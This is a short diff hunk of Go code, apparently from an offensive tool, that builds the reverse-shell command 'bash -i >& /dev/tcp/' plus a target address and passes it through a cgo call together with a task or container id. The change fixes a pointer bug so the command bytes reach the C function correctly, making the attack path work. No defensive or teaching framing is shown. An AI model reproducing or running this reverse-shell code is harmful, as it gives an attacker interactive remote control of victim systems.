@@ -100,7 +100,7 @@ func main() {
 			cmdBytes := []byte("bash -i >& /dev/tcp/" + target + " 0>&1")
 			cmdStr := string(cmdBytes)
 
-			cptr := (*C.uint8_t)(unsafe.Pointer(&cmdBytes))
+			cptr := (*C.uint8_t)(unsafe.Pointer(&cmdBytes[0]))
 			clen := C.size_t(len(cmdBytes))
 			ctidParam := C.uint64_t(uint64(ctidInt))
 			C.tell_pin_ctid(cptr, clen, ctidParam)
